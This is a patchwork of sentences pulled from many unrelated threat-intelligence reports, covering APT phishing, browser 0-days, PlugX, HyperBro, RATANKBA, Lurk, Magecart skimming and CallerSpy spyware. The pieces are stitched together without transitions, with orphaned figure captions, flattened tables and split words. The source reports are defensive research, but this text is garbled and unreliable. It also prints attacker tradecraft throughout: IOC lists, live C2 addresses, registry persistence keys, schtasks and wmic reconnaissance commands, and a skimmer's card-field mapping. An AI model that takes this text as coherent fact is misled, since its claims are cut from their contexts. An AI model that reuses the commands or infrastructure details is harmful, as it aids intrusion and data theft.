One of APT35’s novel techniques involves using Telegram for operator notifications.
The attackers embed javascript into phishing pages that notify them when the page has been loaded.
"The attackers use this function to relay device-based data to the channel, so they can see details such as the IP, useragent, and locales of visitors to their phishing sites in real-time."
We warn users when we suspect a government-backed threat like APT35 is targeting them.
"When a site identified by Safe Browsing as harmful appears in Google Search results, we show a warning next to it in the results."
Indicators from APT28 phishing campaign: service-reset-password-moderate-digital.rf[.]gd reset-service-identity-mail.42web[.]io digital-email-software.great-site[.]net Indicators from APT35 campaigns: Abused Google Properties: https://sites.google[.]com/view/ty85yt8tg8-download-rtih4ithr/ https://sites.google[.]com/view/user-id-568245/ https://sites.google[.]com/view/hhbejfdwdhwuhscbsb-xscvhdvbc/ Abused Dropbox Properties: https://www.dropbox[.]com/s/68y4vpfu8pc3imf/Iraq&Jewish.pdf
Phishing Domains: nco2[.]live summit-files[.]com filetransfer[.]club continuetogo[.]me accessverification[.]online customers-verification-identifier[.]site service-activity-session[.]online identifier-service-review[.]site recovery-activity-identification[.]site review-session-confirmation[.]site recovery-service-activity[.]site verify-service-activity[.]site service-manager-notifications[.]info
Android App: https://www.virustotal.com/gui/file/5d3ff202f20af915863eee45916412a271bae1ea3a0e20988309c16723ce4da5/detection Android App C2: communication-shield[.]site cdsa[.]xyz
Understanding the techniques used by attackers helps us counter these threats effectively.
We believe this is a technique the attacker is using to evade detection rules.
"Code signatures on Windows executables provide guarantees about the integrity of a signed executable, as well as information about the identity of the signer."
"Since mid-August, OpenSUpdater samples have carried an invalid signature, and further investigation showed this was a deliberate attempt to evade detection."
Bytes: 30 0D 06 09 2A 86 48 86 F7 0D 01 01 0B 00 00
"As shown in the following screenshot, the signature is considered to be valid by the Windows operating system."
"Since first discovering this activity, OpenSUpdater's authors have tried other variations on invalid encodings to further evade detection."
The following are samples using this evasion: https://www.virustotal.com/gui/file/5094028a0afb4d4a3d8fa82b613c0e59d31450d6c75ed96ded02be1e9db8104f/detection
New variant: https://www.virustotal.com/gui/file/5c0ff7b23457078c9d0cbe186f1d05bfd573eb555baa1bf4a45e1b79c8c575db/detection
The four exploits were used as a part of three different campaigns.
The links led to attacker-controlled domains that mimicked legitimate websites related to the targeted users.
"The information collected from the fingerprinting phase included screen resolution, timezone, languages, browser plugins, and available MIME types."
"In our environment, we did not receive any payloads past this stage."
Related IOCs lragir[.]org armradio[.]org asbares[.]com armtimes[.]net armlur[.]org armenpress[.]org hraparak[.]org armtimes[.]org hetq[.]org
"After a fingerprinting phase, similar to the one used with the Chrome exploit above, users were served an Internet Explorer 0-day."
We did not recover additional payloads in our environment.
During our investigation we discovered several documents uploaded to VirusTotal.
Related IOCs
Examples of related Office documents uploaded to VirusTotal: https://www.virustotal.com/gui/file/656d19186795280a068fcb97e7ef821b55ad3d620771d42ed98d22ee3c635e67/detection https://www.virustotal.com/gui/file/851bf4ab807fc9b29c9f6468c8c89a82b8f94e40474c6669f105bce91f278fdb/detection
Unique URLs serving ​​CVE-2021-33742 Internet Explorer exploit: http://lioiamcount[.]com/IsnoMLgankYg6/EjlYIy7cdFZFeyFqE4IURS1 http://db-control-uplink[.]com/eFe1J00hISDe9Zw/gzHvIOlHpIXB http://kidone[.]xyz/VvE0yYArmvhyTl/GzV
Word documents with the following classid: {EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B} Related infrastructure: workaj[.]com wordzmncount[.]com Not all attacks require chaining multiple 0-day exploits to be successful.
(NOTE: This exploit is not connected to the other three we’ve discussed above.)
The victim would need to have a session open on these websites from Safari for cookies to be successfully exfiltrated.
There was no sandbox escape or implant delivered via this exploit.
The exploit targeted iOS versions 12.4 through 13.7.
Related IOCs supportcdn.web[.]app vegmobile[.]com 111.90.146[.]198
Increased Utilization
"In the mid-to-late 2010s, more private companies have joined the marketplace selling these 0-day capabilities."
"No longer do groups need to have the technical expertise, now they just need resources."
We encourage anyone who discovers a Chrome vulnerability to report that activity through the Chrome Vulnerabilities Rewards Program submission process.
"Their blog contains write-ups and analysis of vulnerabilities that have been publicly disclosed, including “guest” posts from unwitting legitimate security researchers, likely in an attempt to build additional credibility with other security researchers."
"In the video, they purported to show a successful working exploit that spawns a cmd.exe shell, but a careful review of the video shows the exploit is fake."
"Within the Visual Studio Project would be source code for exploiting the vulnerability, as well as an additional DLL that would be executed through Visual Studio Build Events."
The DLL is custom malware that would immediately begin communicating with actor-controlled C2 domains.
"In addition to targeting users via social engineering, we have also observed several cases where researchers have been compromised after visiting the actors’ blog."
We encourage anyone who discovers a Chrome vulnerability to report that activity via the Chrome VRP submission process.
"If you have communicated with any of these accounts or visited the actors’ blog, we suggest you review your systems for the IOCs provided below."
Host IOCs Registry Keys HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\KernelConfig HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverConfig HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SSL Update File Paths C:\Windows\System32\Nwsapagent.sys C:\Windows\System32\helpsvc.sys C:\ProgramData\USOShared\uso.bin C:\ProgramData\VMware\vmnat-update.bin C:\ProgramData\VirtualBox\update.bin
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2020.
"It was last updated on January 26, 2021."
We terminated 12 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We received leads from Facebook that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Myanmar.
We terminated 35 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We received leads from the FBI that supported us in this investigation.
We terminated 2 YouTube channels as part of our ongoing investigation into a coordinated influence operation linked to Iran.
We terminated 10 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 22 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Indonesia.
We received leads from the FBI that supported us in this investigation.
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 9 YouTube channels as part of our investigation into a coordinated influence operation linked to Egypt.
We terminated 6 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 1 YouTube channel as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
We terminated 1 blog as part of our investigation into coordinated influence operations linked to Argentina.
We terminated 3 YouTube channels as part of our investigation into coordinated influence operations linked to France.
We terminated 34 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
"We terminated 3,317 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
"In June, we announced that we saw phishing attempts against the personal email accounts of staffers on the Biden and Trump campaigns by Chinese and Iranian APTs (Advanced Persistent Threats) respectively."
We haven’t seen any evidence of such attempts being successful.
The Iranian attacker group (APT35) and the Chinese attacker group (APT31) targeted campaign staffers’ personal emails with credential phishing emails and emails containing tracking links.
"As part of our wider tracking of APT31 activity, we've also seen them deploy targeted malware campaigns."
"Every malicious piece of this attack was hosted on legitimate services, making it harder for defenders to rely on network signals for detection."
"In one example, attackers impersonated McAfee."
"The targets would be prompted to install a legitimate version of McAfee anti-virus software from GitHub, while malware was simultaneously silently installed to the system."
This targeting is consistent with what others have subsequently reported.
"Shortly after the U.S. Treasury sanctioned Ukrainian Parliament member Andrii Derkach for attempting to influence the U.S. electoral process, we removed 14 Google accounts that were linked to him."
"As the course of the COVID-19 pandemic evolves, we’ve seen threat actors evolve their tactics as well."
"In previous posts, we discussed targeting of health organizations as well as attacker efforts to impersonate the World Health Organization."
"In the threat actor toolkit, different types of attacks are used for different purposes: Phishing campaigns can be used like a scalpel—targeting specific groups or individuals with personalized lures that are more likely to trick them into taking action (like clicking on a malware link), while DDoS attacks are more like a hatchet—disrupting or blocking a site or a service entirely."
"While it’s less common to see DDoS attacks rather than phishing or hacking campaigns coming from government-backed threat groups, we’ve seen bigger players increase their capabilities in launching large-scale attacks in recent years."
"For example in 2017, our Security Reliability Engineering team measured a record-breaking UDP amplification attack sourced out of several Chinese ISPs (ASNs 4134, 4837, 58453, and 9394), which remains the largest bandwidth attack of which we are aware."
"Through the Apex One with Endpoint Sensor (iES), we discovered one such incident wherein an attacker utilized sophisticated techniques in an attempt to exfiltrate sensitive information from a company."
Technical analysis Detection
We noticed the execution of schtasks.exe with the command line parameter “schtasks /create /tn <name> c:\programdata\<software name>\<file name>.bat /sc /once /st <time> /ru <user account>”.
The scheduled task was not created for persistence.
The batch file that was to be executed had a suspicious name that stood out.
This prompted us to dig deeper.
Evasion
The image file of the process residing in the Windows directory that triggered the schtasks command was marked as normal.
PlugX and malicious BLOBs
"Reversing the file revealed that it was the PlugX loader, a remote access tool (RAT) that has been historically used in attacks targeting government-related industries and organizations."
Figure 1.
"The relationship between the normal file used, the PlugX, and the malicious BLOB Despite being around for quite some time, PlugX is still effective at evading detection."
Detection support for the BLOB is probably low.
"Aside from this, changing the encryption mechanism or packer would result in a totally different BLOB."
It should be noted that we have also observed an increase use of BLOB files since 2020.
A closer look at PlugX svchost injection
"This variant of PlugX (detected by Trend Micro as Backdoor.Win32.PLUGX.DYSGUT), including the code in the BLOB, launches an svchost.exe process and injects to it."
"Usually, svchost is launched by services.exe, so the action done by PlugX could be used as a trigger for investigation."
"Svchost injection is not new — in fact, Trickbot and other malware variants use this technique."
The difference between Trickbot and PlugX is that Trickbot is much easier to detect.
"Trickbot’s binary, which is not whitelisted, does the injection; in PlugX’s case, a normal process that is possibly whitelisted, does the injection."
Our investigation shows that the attacker used other tools during the attack.
The tools used varied from network scanners to account harvesters.
Figure 2.
"To avoid this, the attacker chose a different approach."
"For every tool that needs to be run, it creates three things: The auxiliary tool file <filename>.bat file Cmd.exe with a schtasks.exe command to create a scheduled task to run the batch file above Instead of directly launching the auxiliary tool, it makes use of a scheduled task that runs the batch file that, in turn, executes the tool."
The attacker’s usage of a tool can be divided into two separate events: the dropping of the tool by the svchost.exe process that runs the malicious code and the execution of the tool via the scheduled task.
"If the creation of the tool, batch file, and scheduled task is disregarded, it would seem that there is no connection between PlugX and the execution of the auxiliary tool."
"However, a deeper investigation proved otherwise."
Figure 4.
"Launching the auxiliary tool via the scheduled task Scheduled tasks are usually associated with persistence or privilege escalation, which is not the case in this incident."
Having the scheduled task run only once removes the notion of persistence.
"Meanwhile, having the same user account launch the PlugX process and the auxiliary tool shows that the scheduled task is not for privilege escalation."
"However, the attacker was able to delete it before we were able to get our hands on the tools used for investigation purposes."
An analysis of these tools could be used to better understand what is happening or what has happened in the environment.
"Whenever a tool is used, the attacker deletes it from the disk as soon as it has done its purpose – which usually does not last for more than 15 minutes."
"Based on our investigation of this specific attack, we provide helpful tips for enterprises and organizations to spot PlugX and lateral movement in their environments."
"Threat hunters can use this to possibly identify other machines that have PlugX installed: Using attributes that could identify the normal file, such as the hash and the digital signer, a sweeping task could be carried out to identify instances of the normal file."
"Chances are, the normal file that loads the rest of PlugX uses a file name that is different from what it normally uses or is in a location where it is not usually found."
"For example, Microsoft’s outlook.exe is usually found in the Program Files directory."
Finding such entries that stand out could help identify how wide the infection is.
How to spot lateral movement
"In this particular attack, we observed that to perform lateral movement, the attacker mapped Windows admin shares and used remotely created scheduled tasks to launch malware."
Both events never or rarely happened in the victim’s environment.
The importance of looking into anomalous events
"When identifying PlugX and lateral movement techniques utilized in attacks, it’s important to be able to determine anomalous events."
Keeping an eye on anomalous events could help detect incidents earlier.
"Trend Micro Solutions Trend Micro’s comprehensive XDR solution applies the most effective expert analytics to the deep data sets collected from Trend Micro solutions across the enterprise — including email, endpoints, servers, cloud workloads, and networks — making faster connections to identify and stop attacks."
"One console with one source of prioritized, optimized alerts supported with guided investigation simplifies the steps needed to fully understand the attack path and impact on the organization."
"HyperBro is a malware family used by Iron Tiger (also known as Emissary Panda, APT27, Bronze Union, and Luckymouse), an advanced persistent threat (APT) group that has been performing cyberespionage for almost a decade, and there have been no reports of this group associated with a tool for Mac operating systems (OS)."
Further investigation showed that MiMi chat installers have been compromised to download and install HyperBro samples for the Windows platform and rshell samples for the Mac OS platform.
"Infection vector MiMi (mimi = 秘密 = secret in Chinese) is an instant messaging application designed especially for Chinese users, with implementations for major desktop and mobile operating systems: Windows, macOS, Android, and iOS."
We already came across an abuse of this application during the Earth Berberoka investigation.
"Also, we could not find anything malicious in the latest Windows installer."
"In this case, we can see that it took an hour and a half for the attackers to modify the legitimate installer and add malicious code to it."
"For older versions, it took the attackers one day to inject its modifications."
"Once deobfuscated, we saw that the inserted code downloads rshell from the IP address 139[.]180[.]216[.]65 and executes it once run on the macOS platform."
"After looking at previous versions of this installer, we found that the first compromised version was 2.3.0, built on May 26, 2022, while the previous version (2.2.10, published on May 6, 2022) was clean."
Figure 4. Malicious Javascript code inserted into 2.2.0.exe targeting Windows OS Figure 5.
Malware analysis rshell
"The OS information collection routine gathers the following information: GUID: (randomly generated guid, stored in /tmp/guid) computer name: uname (nodename)"
Explanation
Cmd Init Start new shell Cmd close
Kill shell Cmd data
", another warning message about an unverified developer is displayed."
Figure 7. Unverified developer warning with the “Open” button noticeably missing
"Afterward, one more warning about the unverified developer is displayed."
Unverified developer warning with the “Open” button enabled
HyperBro
The HyperBro malware family has been around since 2017 and has been extensively analyzed.
"It was updated in mid-2019, which we described in detail in our Operation DRBControl paper."
"The said company was formerly known as Kingsoft Internet Software Holdings Limited, wherein during our previous investigation on the group, we already found one HyperBro DLL signed by a certificate belonging to Kingsoft."
Targets
We found 13 different targets while following our sensors‘ data.
"Interestingly, we found a sample from the Reptile rootkit framework in that same company, as well as network requests to a subdomain that belongs to Earth Berberoka’s infrastructure."
Threat actor modified version 2.2.0 of Windows MiMi chat installer to download and execute HyperBro backdoor May 2021:
"First, the dlpprem32.dll file linked to HyperBro shares certain characteristics (specifically imphash, RICH header) with previous samples already attributed to the group."
"Also, the file names involved in the decoding and loading of HyperBro are similar to those we witnessed during our investigation last year."
"Second, one of the Linux rshell samples used the IP address 45[.]142[.]214[.]193 as its C&C."
"In 2020, that IP address had a particular reverse DNS: nbaya0u2[.]example[.]com."
"During our Operation DRBControl investigation, we found a HyperBro sample that had 138[.]124[.]180[.]108 as its C&C. This second IP address had nbaya0u1[.]example[.]com as its reverse DNS."
"However, as the rshell sample was found in 2021, we initially did not find this correlation strong enough to attribute the rshellmalware family to Iron Tiger."
We also found some links to Earth Berberoka.
"From one of the victims where we found an rshell sample, we also found a binary belonging to the Reptile rootkit framework, a rootkit identified as part of the arsenal of Earth Berberoka."
"We also noticed network communications from this victim to a subdomain of Earth Berberoka, suggesting it could have been previously compromised by this threat actor."
One of the rshell samples had center[.]veryssl[.]org as the C&C.
"Both findings suggest that those victims could be compromised by both threat actors, or that Earth Berberoka is actually a subgroup of Iron Tiger."
"As a reminder, while investigating Earth Berberoka, we found multiple links to Iron Tiger that we detailed in our research."
Indicators of Compromise (IOCs)
"Updated the detection names on January 25, 2018, 9:47 PM PDT"
The malware known as RATANKBA is just one of the weapons in Lazarus’ arsenal.
"We analyzed a new RATANKBA variant (BKDR_RATANKBA.ZAEL-A), discovered in June 2017, that uses a PowerShell script instead of its more traditional PE executable form—a version that other researchers also recently identified."
We identified a number of servers Lazarus used as a backend system for temporarily holding stolen data.
They could have also been performing exercises in preparation for an attack against similar targets.
Lazarus’ backend logs also record victim IP addresses.
Infection Flow Figure 1.
"RATANKBA Infection Flow RATANKBA is delivered to its victims using a variety of lure documents, including Microsoft Office documents, malicious CHM files, and different script downloaders."
These documents contain topics discussing either software development or digital currencies.
An example of a lure used in a RATANKBA attack can be seen below: Figure 2. Malicious CHM file used as RATANKBA lure
This RATANKBA backdoor is what is used to communicate with RATANKBA’s Command-and-Control (C&C) server.
Killkill: Stops the backdoor’s activities interval: Changes the interval in which the backdoor retrieves jobs; the default interval is set at 120 seconds cmd: Executes shell commands exe:Reflectively injects a DLL downloaded from a specific URL
"In addition to the backdoor’s modus operandi, the attackers will use a Microsoft WMI command-line tool to list the compromised system’s running processes, which are sent to the C&C server: “C:\Windows\system32\cmd.exe” /c “wmic process get processid,commandline,sessionid | findstr SysWOW” “C:\Windows\system32\cmd.exe” /c “wmic process get processid,commandline,sessionid | findstr x86” Technical Analysis"
"During our analysis, we collected a copy of the RATANKBA malware’s Lazarus Remote Controller tool."
Figure 3. RATANKBA communication diagram
The controller downloads the victim profiles from the server.
Below are the various functionalities of RATANKBA’s controller:
Deletes the downloaded victim profiles delete_con Deletes the connection log files if they were already downloaded
Kill: Posts a job to kill the backdoor inject Posts a job for DLL injection Interval Changes the sleep interval Cmd
RATANKBA main console interface
Figure 5.
RATANKBA host manipulation console RATANKBA’s controllers use the “Nimo Software HTTP Retriever 1.0” user-agent string for its communication.
The shift from PE to Powershell makes it more difficult for antivirus solutions to detect.
"The screenshot below shows the conversion from C/C++ code to Powershell, while the protocol remained unchanged."
Figure 6. C/C++ version of RATANKBA Figure 7. Powershell version of RATANKBA Profile of the Attackers
"While we do not have any knowledge of who the actual Lazarus attackers are, the data collected from the backend systems gives us some insights into the internet usage patterns of systems likely owned by Lazarus group members."
Figure 8. Empty cryptocurrency wallet of the attacker Figure 9.
An attacker mining Ant Share Defending against RATANKBA
Trend Micro™ Deep Security™ provides virtual patching that protects endpoints from threats such as malicious redirections to malware-hosting URLs as well as those that exploit unpatched vulnerabilities.
A detailed timeline of the Lazarus group's operations can be seen here.
Indicators of Compromise (IoCs): Hashes detected as BKDR_RATANKBA.ZAEL-A 1768f2e9cea5f8c97007c6f822531c1c9043c151187c54ebfb289980ff63d666 6cac0be2120be7b3592fe4e1f7c86f4abc7b168d058e07dc8975bf1eafd7cb25 d844777dcafcde8622b9472b6cd442c50c3747579868a53a505ef2f5a4f0e26a db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471 f7f2dd674532056c0d67ef1fb7c8ae8dd0484768604b551ee9b6c4405008fe6b Hashes detected as CHM_DLOADER.ZCEL-A 01b047e0f3b49f8ab6ebf6795bc72ba7f63d7acbc68f65f1f8f66e34de827e49 030b4525558f2c411f972d91b144870b388380b59372e1798926cc2958242863 10cbb5d0974af08b5d4aa9c753e274a81348da9f8bfcaa5193fad08b79650cda 650d7b814922b58b6580041cb0aa9d27dae7e94e6d899bbb3b4aa5f1047fca0f 6cb1e9850dd853880bbaf68ea23243bac9c430df576fa1e679d7f26d56785984 6d4415a2cbedc960c7c7055626c61842b3a3ca4718e2ac0e3d2ac0c7ef41b84d 772b9b873100375c9696d87724f8efa2c8c1484853d40b52c6dc6f7759f5db01 9d10911a7bbf26f58b5e39342540761885422b878617f864bfdb16195b7cd0f5 d5f9a81df5061c69be9c0ed55fba7d796e1a8ebab7c609ae437c574bd7b30b48 Hashes detected as JS_DLOADER.ZBEL-A 8ff100ca86cb62117f1290e71d5f9c0519661d6c955d9fcfb71f0bbdf75b51b3 Hashes detected as X97M_DLOADR.ZBEL-A 972b598d709b66b35900dc21c5225e5f0d474f241fefa890b381089afd7d44ee Hashes detected as VBS_DLOADR.ZAEL-A 4722138dda262a2dca5cbf9acd40f150759c006f56b7637769282dba54de0cab Tags Malware | APT & Targeted Attacks | Endpoints | Cyber Crime | Research | Network
"A typical Lurk infection uses browser exploits to deliver non-persistent payloads to potential victims, probing their targets before deploying additional malware."
Nine more suspected members of the group were arrested by Russia's Ministry of Internal Affairs on February 8.
How did Lurk evolve from a clique of threat actors to a full-fledged cybercriminal group?
What other techniques were they known for—that other cybercriminals emulated?
Lurk’s web-based attacks were the first signs of their campaigns.
The group already implemented certain mechanisms to prevent AV detection.
"Requests during a time period or from a source IP address that didn’t match their preferred distribution area, for instance, would yield a redirect to a third-party site such as Google."
Lurk compromised systems by exploiting web browser vulnerabilities via drive-by download attacks.
"Malvertising and poisoning of content-serving application components, such as memcached cache poisoning, were also part of their traffic redirection methods."
Stealth was already a fixture in their operations.
During this time we developed URL-based signatures and used them to detect Lurk-related network traffic.
The signature pattern ^[A-Z0-9]{4}$ was particularly effective in detecting URL patterns employed by Lurk from 2011 to 2013.
"Mid-2012 to mid-2014: Honing the Craft Lurk was most prolific during this period, with its series of URL redirection campaigns in Russia becoming more extensive."
Lurk also targeted programmatic advertising infrastructures to increase the scale of their operations.
"When 2014 rolled in, Lurk started exhibiting some patterns similar with the Angler exploit kit."
Figure 1. Exploit loading sequence in ria[.]ru (February 2012) Figure 2. [bg].ru (February 2012) found redirecting victims to Lurk’s exploit kit Figure 3. Redirects to the Lurk landing page from adfox[.]ru banner network Figure 4. Malicious iframe content served by tks[.]ru (August 2013)
Lurk’s transition from simple web-browser-exploiting crooks to organized cybercriminals also stood out.
"Serving criteria were often modified, malicious payloads were often updated."
"While Lurk only exploited a certain set of browser vulnerabilities, the exploit code also often changed."
"The initial bodiless payload was designed to be triggered by the exploit kit shellcode, which performed routine checks in the infected machine."
"Acquiring additional modules of the group’s malware, for instance, was nearly impractical if the exploit URLs were loaded in a sandboxed environment."
"Malicious content were also often distributed during lunchtime (Moscow’s timezone), and in very short intervals."
Lurk’s infrastructure also exhibited new capabilities.
The mechanisms of redirections were different for each intermediate victim.
vesti[.]ru utro[.]ua
womanhit[.]ru Figure 5.
Lurk’s intermediate targets by year 2014 to 2016:
Going Global 2014 was a significant year in Lurk’s history.
Why not go global to turn in more profit?
"By the second half of the year, Lurk’s geographical distribution drastically changed."
"Lurk then launched a new URL pattern that served payloads round-the-clock, eschewing pre-filtering of IP address locations in favor of targeting global IP addresses."
It was delivered only if the victim’s source IP address (and time) met Lurk’s parameters—otherwise users received a 404 error response.
2016: Lurk’s Downfall Lurk’s active compromise of financial institutions led to a series of enquiries that culminated in the arrest of over 50 individuals involved in its operations across Russia.
The ripple effect led other cybercriminal groups to lie low for the rest of the year.
"By then, Angler’s activities already ceased."
Coincidence?
"Unfortunately, Lurk is just one of the many cybercriminal groups looking to profit from organizations and end users."
Best Practices Lurk’s story demonstrates the aptitude of cybercriminals for honing in on specific victims and profiting from them.
This should be especially enforced for HTTP and HTTPS protocols that cybercriminals frequently leverage for their attacks.
"Updated as of February 6, 2017, 10:05 PM (UTC-7): We updated to include observed systems from other countries that connected to IP addresses operated by Lurk."
"Updated as of February 9, 2017, 1:44 AM (UTC-7): We updated to include the latest news about the arrests of suspected members of the group. Tags APT & Targeted Attacks | Malware | Endpoints | Research"
"According to a report by Bloomberg, JBS USA had shutdowns at its nine beef plants on Tuesday, May 31."
"The company's meatpacking facilities across the US have also experienced some level of disruptions to operations, said an official with the United Food and Commercial Workers International Union."
"The JBS cyber attack comes just three weeks after Colonial Pipeline, the US's largest pipeline system, was targeted in a ransomware attack."
"Earlier in May, Ireland's Health Service Executive (HSE) was also hit by a ransomware attack, which continues to result in major issues."
"Twenty days later, HSE continues to face IT system difficulties, causing delays in some of its services."
Executives and decision-makers must understand that cybersecurity is not just an IT issue but a major element that affects the entire organization and its operations.
What happened?
"The attacks have been traced back to January 6, 2021, when a new threat group subsequently labelled “Hafnium” by Microsoft began exploiting four zero-day bugs in Microsoft Exchange Server."
This could include deploying ransomware to victim organizations.
CISA ordered government agencies to patch now or disconnect their on-premises Exchange servers.
There is also a possible connection to the Chopper ASPX web shell research we published back in January 2021.
Am I impacted?
"Whatever the source, former CISA boss Chris Krebs warns that SMBs, education sector organizations, and state and local governments may be disproportionately affected as these often have fewer resources to spend on security."
What happens next?
Do not re
image any machines until after a forensic scan has been done to ensure you’ve preserved any IoCs.
"This year’s evaluation saw vendors detect and respond to tactics, techniques, and procedures (TTPs) from two emulated adversary scenarios that are broadly defining modern ransomware today — Wizard Spider, a cybercriminal extortion gang, and Sandworm, a disruptive threat group focused on data destruction."
"Critical evaluation categories include: Analytic Coverage: Enriched detections to deliver greater context to investigation by adding ATT&CK TTP mapping, improving triage for analysts."
It tested against simulated breaches that included 109 total attack steps.
"Detection: Delivered on 19/19 attack steps in the evaluation, for 100% detection."
"The increase in efficiency simplifies investigations, optimizes SecOps productivity, and accelerates remediation to stop threat actors in their tracks before they have a chance to cause lasting damage."
We uncovered a recent activity involving the notorious online credit card skimming attack known as Magecart.
The attacker injected their skimming script into the shared JavaScript libraries used by online stores on the PrismWeb platform.
The amount of payment information that was stolen is still unknown.
We disclosed our findings to PrismRBS.
Figure 1. Mirrorthief attack chain Figure 2.
"On April 14, the attackers injected a script to the payment checkout libraries used by the PrismWeb platform."
"The location of injected payment checkout libraries on affected online stores were: hxxps://[online store domain]/innerweb/v4.0/include/js/checkout_payment[.]js hxxps://[online store domain]/innerweb/v3.1/include/js/checkout_payment[.]js The injected script forged the Google Analytics script format, but loaded a different script from the attackers’ server."
The loaded script is the main script that steals the payment information.
"Unlike many web skimmers, which are designed to collect information from many kinds of e-commerce payment pages in general, the skimmer that the Mirrorthief group used was designed specifically for PrismWeb’s payment page."
HTML Element ID Mirrorthief JSON Data Schema Information _cc_number aa
Credit card number _cc_expmonth bb Credit card expiration month _cc_expyear cc Credit card expiration year cc_type dd
Credit card CVN number cc_first_name ff First name of cardholder cc_last_name gg Last name of cardholder bill_to_phone hh Phone number for billing bill_to_country ii
Billing address (city) bill_to_zip nn
Billing address (zip code) Table 1.
Comparing Magecart-wielding groups The Mirrorthief group made the injected script on the compromised libraries similar to legitimate Google Analytics script and registered their malicious domain (which also appears similar to the original Google Analytics domain) to disguise their activity.
"Impersonating the Google Analytics service is a known tactic also used by Magecart Group 11, the group behind the Vision Direct breach."
"When we checked Mirrorthief’s network infrastructure, we found that it did not have any overlap with any known cybercrime groups."
"In addition, the skimmer Mirrorthief used in the attack is very different from the others since it’s specially designed to skim PrismWeb’s payment form."
Below is a table for comparison.
Group Encryption Algorithm JavaScript Library Magecart Group 11 AES Gibberish-AES ReactGet RSA JSEncrypt Mirrorthief AES Crypto-JS Table 2. Comparison of encryption algorithms used by the different groups
Figure 5. Magecart Group 11 injection pattern Figure 6.
ReactGet Group injection pattern Figure 7.
Mirrorthief Group injection pattern
"IT and security teams should restrict or disable outdated components, and habitually monitor websites and applications for any indicators of suspicious activity that could lead to data exfiltration, execution of unknown scripts, or unauthorized access and modification."
"The following Trend Micro solutions, powered by XGen™ security, protect users and businesses by blocking the scripts and preventing access to the malicious domains: Trend Micro™ Security Smart Protection Suites and Worry-Free™ Business Security Trend Micro Network Defense Hybrid Cloud Security Indicators of Compromise (IoCs) Indicator Attribution 30c8be0d9deb59d98f7e047579763559f2c2dd9a7b4477636afcbebaaebc7dc5 Mirrorthief skimming script hash (detected as Trojan.JS.MIRRORTHEIF.AA) cloudmetric-analytics[.]com Mirrorthief malicious domain hxxps://cloudmetric-analytics[.]com/ga[.]js"
Mirrorthief
malicious URL hxxps://cloudmetric-analytics[.]com/analytics[.]js Mirrorthief malicious URL hxxps://cloudmetric-analytics[.]com/analytic[.]php?ccm_post= Mirrorthief malicious URL hxxps://g-analytics[.]com/libs/analytics[.]js Magecart Group 11 malicious URL hxxps://ebitbr[.]com/api[.]js ReactGet Group malicious URL
We found a new spyware family disguised as chat apps on a phishing website.
"We first came across the threat in May on the site http://gooogle[.]press/, which was advertising a chat app called “Chatrious.”"
The website became inactive for months after that encounter in May.
Trend Micro detects both of the threats as AndroidOS_CallerSpy.HRX.
Figure 1.
Figure 2.
"It also receives commands from the C&C server to take screenshots, which it later sends to the server."
Figure 3.
Scheduled jobs Source Command alive_latest_files_watcher Starts latest_files_watcher job and keeps it alive enviorment_schedulers
Configures
environment record module keep_enviorment_scehdular_alive
Records environment remote_sync
Figure 4.
Privacy database
The screenshot gets captured when a command is received from the C&C server.
Figure 5.
Infrastructure analysis
The domain gooogle[.]press masquerades as Google to trick users into downloading the app.
Figure 6. Fake copyright info
"Whois Lookup reveals that this domain was registered on February 11, 2019 at Namecheap."
"However, we found that all the registrant data was untraceable."
Figure 7. gooogle[.]press registration info
"We did catch four C&C IP addresses, all hosted on a legitimate service."
Figure 8.
VirusTotal scan result
"We also conclude that this is the initial phase of an attack based on the following reasons: CallerSpy, as it is now, could prove uneven for a targeted attack."
We also found some debug code left in CallerSpy.
Figure 9.
Figure 10.
Figure 11.
Indicators of Compromise (IoCs) SHA-256 Package name Label 0c4b08bec1251b1ebc715a7ef1a712cdcb4d37ce0093d88f7fa73b0e05bf7b0e com.sas.gplayservices.accesibility GSERVICES 38acf26161a2c6429ee40d9b70d8419a9bd00eaa8740d221f943cea3229372dd com.sas.gservices.accesibility GSERVICES 3bf85d0aff5ddc0c57e43b879631ee692d98d01f5c964336471f1cdfe0d291f8 com.example.rat rat 7cb0eb93de496e2141b6e0541465ca71a84063867381085692885c75aa59cb1b com.pdf.searcher.dd Pdf Searcher 8ad18bd8f5d2f1fd9e00211170e8a540ddf7f51618588fab31b4ddd2b34b75e1 com.pdfd.researcher.resaq_ver1 Caller c8e1a702a27309c22728792c64aad4abc14ec2bfad1b30a4f27b8ebc6bcc68ff com.sas.gservices.accesibility GSERVICES C&C servers 3.95.71.123:3000 18.206.105.66:3000 40.114.109.69:3000 52.21.5.241:2000 Phishing domain http://gooogle[.]press/ MITRE ATT&CK Techniques Tactic Technique ID Description Initial Access Masquerade as Legitimate Application T1444 Used to masquerade as a legitimate chat app Persistence Abuse Device Administrator Access to Prevent Removal T1401
Used to request device administrator privilege Persistence
Used to listen for the BOOT_COMPLETED broadcast Defense Evasion Suppress Application Icon T1508
Used to suppress its icon from being displayed to the user in the application launcher to hide the fact that it is installed Discovery File and Directory Discovery T1420
Used to enumerate external storage file system Discovery Location Tracking T1430 Used to track device’s location Collection Access Call Log T1433 Used to gather call log data Collection Access Contact List T1432 Used to gather contact list data
Collection Capture Audio T1429 Used to record audio information Collection Capture SMS Messages T1412 Used to collect SMS messages
"Collection Data from Local System T1533 Used to collect files from the device, including documents, photos, and media files"
Collection Location Tracking T1430 Used to track device’s location
"Collection Screen Capture T1513 Used to take screenshot on the device Exfiltration Standard Application Layer Protocol T1437 Used Standard HTTP Protocol Command and Control Uncommonly Used Port T1509 Used uncommon ports 2000, 3000"
Mobile | Phishing
